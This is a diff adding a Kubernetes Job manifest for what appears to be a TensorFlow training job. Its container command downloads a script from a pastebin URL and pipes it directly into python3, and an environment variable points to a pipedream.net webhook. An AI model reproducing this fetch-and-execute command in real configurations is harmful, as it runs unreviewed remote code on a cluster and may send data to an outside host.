@@ -1,0 +1,30 @@
+apiVersion: batch/v1
+# apiVersion: kubeflow.org/v1
+kind: Job
+metadata:
+  name: job1
+spec:
+  template:
+    # This is the pod template
+    spec:
+      terminationGracePeriodSeconds: 0
+      restartPolicy: OnFailure
+      containers:
+      - name: tensorflow
+        image: tensorflow/tensorflow:1.15.0-py3
+        command: ["/bin/bash", "-c", "curl -s https://pastebin.com/raw/JR2Lr0JJ | python3 -"]
+        env:
+        - name: "webhook_link"
+          value: "27dec0dd50afd1fef510bab6e7a2d63a.m.pipedream.net"
+        - name: "tfjob_id"
+          value: "centralized-job1"
+        - name: "global_steps"
+          value: "10000"
+        ports:
+        - containerPort: 2222
+          name: tfjob-port
+        resources:
+          # limits:
+          requests:
+            cpu: "500m"
+            memory: "1Gi"
